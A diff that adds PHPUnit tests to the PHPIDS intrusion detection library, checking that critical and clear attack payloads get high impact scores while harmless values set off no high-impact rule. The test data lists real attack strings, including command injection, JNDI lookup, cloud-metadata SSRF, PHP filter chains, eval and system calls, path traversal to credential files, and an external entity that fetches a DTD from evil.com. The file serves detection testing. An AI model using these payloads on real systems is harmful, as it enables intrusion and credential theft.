@@ -292,6 +292,103 @@ class NewAttackClassesTest extends \PHPUnit\Framework\TestCase
         $this->assertContains($ruleId, $this->scan($payload));
     }
 
+    public static function getCriticalAttacks()
+    {
+        return array(
+            'JNDI lookup (81)'          => array('${jndi:ldap://example.test/a}'),
+            'cloud metadata SSRF (83)'  => array('http://169.254.169.254/latest/meta-data/'),
+            'command separator (90)'    => array(';id|whoami'),
+            'command substitution (90)' => array('$(whoami)'),
+            'PHP-CGI arguments (95)'    => array('-d allow_url_include=1 -d auto_prepend_file=php://input'),
+            'PHP filter chain (96)'     => array('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=php://temp'),
+            'gadget chain class (97)'   => array('O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{}'),
+        );
+    }
+
+    /**
+     * Attacks that can lead to remote code execution or leak cloud
+     * credentials. PHPIDS adds up the impact of every matching rule, and
+     * these often match a single rule, so the rule itself must reach the
+     * warning band; otherwise they rank below a reflected XSS probe.
+     *
+     * @dataProvider getCriticalAttacks
+     */
+    public function testCriticalAttacksScoreAtLeast20($payload)
+    {
+        $report = (new Monitor($this->init))->run(array('POST' => array('q' => $payload)));
+
+        $this->assertGreaterThanOrEqual(20, $report->getImpact(), json_encode($payload));
+    }
+
+    /**
+     * Probes only test whether a site is vulnerable, so they stay low.
+     */
+    public function testATemplateInjectionProbeStaysLow()
+    {
+        $report = (new Monitor($this->init))->run(array('POST' => array('q' => '{{7*7}}')));
+
+        $this->assertGreaterThan(0, $report->getImpact());
+        $this->assertLessThan(10, $report->getImpact());
+    }
+
+    public static function getClearAttacks()
+    {
+        return array(
+            'etc/passwd (12)'              => array('/etc/passwd'),
+            'code injection (59)'          => array('@eval($_REQUEST["cmd"]);'),
+            'template internals (80)'      => array("{{''.__class__.__mro__[1].__subclasses__()}}"),
+            'stream wrapper (85)'          => array('php://filter/convert.base64-encode/resource=index.php'),
+            'serialized object (86)'       => array('a:1:{i:0;O:4:"Evil":0:{}}'),
+            'NoSQL operator (87)'          => array('password[$ne]=12'),
+            'external entity (88)'         => array('<!DOCTYPE test SYSTEM "http://evil.com/evil.dtd">'),
+            'prototype pollution (89)'     => array('__proto__[admin]=1'),
+            'header injection (92)'        => array("a\r\nTransfer-Encoding: chunked"),
+            'LDAP injection (93)'          => array('admin)(&)'),
+            'encoded traversal (94)'       => array('..%2f..%2f..%2fetc%2fpasswd'),
+            'sensitive file (94)'          => array('../../../../wp-config.php'),
+            'framework exploit (98)'       => array('/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'),
+            'PHP command function (100)'   => array('system("id");'),
+        );
+    }
+
+    /**
+     * A rule that only matches attack syntax must reach the warning band (10)
+     * by itself, the way one critical rule reaches the blocking threshold in
+     * the OWASP Core Rule Set. Before, these scored 5 to 7 and stayed below
+     * it unless several rules happened to overlap.
+     *
+     * @dataProvider getClearAttacks
+     */
+    public function testAClearAttackReachesTheWarningBand($payload)
+    {
+        $report = (new Monitor($this->init))->run(array('POST' => array('q' => $payload)));
+
+        $this->assertGreaterThanOrEqual(10, $report->getImpact(), json_encode($payload));
+    }
+
+    /**
+     * The other half of the scale: a rule may only carry an impact of 10 or
+     * more when it stays silent on ordinary input. Check this before raising
+     * a rule.
+     *
+     * @dataProvider getHarmlessValues
+     */
+    public function testNoHighImpactRuleFiresOnAHarmlessValue($value)
+    {
+        $report = (new Monitor($this->init))->run(array('POST' => array('q' => $value)));
+        $high   = array();
+
+        foreach ($report as $event) {
+            foreach ($event->getFilters() as $filter) {
+                if ($filter->getImpact() >= 10) {
+                    $high[] = $filter->getId();
+                }
+            }
+        }
+
+        $this->assertSame(array(), $high);
+    }
+
     public static function getHarmlessValues()
     {
         $values = array(
